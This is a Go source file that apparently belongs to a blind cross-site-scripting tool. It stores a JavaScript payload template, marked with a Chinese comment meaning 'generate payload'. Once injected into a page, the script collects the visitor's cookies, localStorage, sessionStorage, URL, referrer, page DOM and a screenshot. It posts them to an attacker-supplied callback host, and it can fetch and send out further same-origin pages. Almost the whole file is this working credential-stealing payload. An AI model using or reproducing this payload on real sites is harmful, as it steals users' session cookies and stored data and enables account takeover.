package payload

//TODO 生成payload

const payload = `
function ez_n(e){return void 0!==e?e:""}
function ez_cb(e){var t=new XMLHttpRequest;t.open("POST","//%s/callback",!0),t.setRequestHeader("Content-Time","%s"),t.setRequestHeader("Content-type","text/plain"),t.onreadystatechange=function(){4==t.readyState&&t.status},t.send(JSON.stringify(e))}
function ez_hL(){try{ez_rD.uri=ez_n(location.toString())}catch(e){ez_rD.uri=""}try{ez_rD.cookies=ez_n(document.cookie)}catch(e){ez_rD.cookies=""}try{ez_rD.referer=ez_n(document.referrer)}catch(e){ez_rD.referer=""}try{ez_rD.origin=ez_n(location.origin)}catch(e){ez_rD.origin=""}try{ez_rD.localstorage=ez_n(window.localStorage);}catch(e){ez_rD.localstorage="";}try{ez_rD.sessionstorage=ez_n(window.sessionStorage);}catch(e){ez_rD.sessionstorage="";}try{ez_rD.dom=%s}catch(e){ez_rD.dom=""}
try{ez_rD.uuid="%s"}catch(e){ez_rD.uuid="%s"}try{html2canvas(document.body).then(function(e){ez_rD.screenshot=ez_n(e.toDataURL()),ez_c();});}catch(e){ez_rD.screenshot="",ez_c()}
function ez_c(){ez_nW(),ez_cb(ez_rD),ez_cp()}}
function ez_cp(){var p=[{}];var q,r;for(q=0,r=p.length;q<r;++q){ez_dc(p[q])}}
function ez_dc(e){try{var u="//"+location.hostname+e,x=new XMLHttpRequest;x.onreadystatechange=function(){4==x.readyState&&(cbdata={dom:ez_n(x.responseText),uri:ez_n(u),origin:ez_n(location.hostname),referer:"Collected page via "+ez_n(location.toString()),cookies:ez_n(document.cookie),"user-agent":ez_n(navigator.userAgent),sessionstorage:ez_n(window.sessionStorage),localstorage:ez_n(window.localStorage),"id":"123"},ez_cb(cbdata))},x.open("GET",u,!0),x.send(null)}catch(j){}}
function ez_aE(e,t,n){e.addEventListener?e.addEventListener(t,n,!1):e.attachEvent&&e.attachEvent("on"+t,n)}ez_rD={},"complete"==document.readyState?ez_hL():ez_aE(window,"load",function(){ez_hL()});
function ez_nW(){try{ez_r()}catch(e){}}
function ez_r() {
 %s
}
`
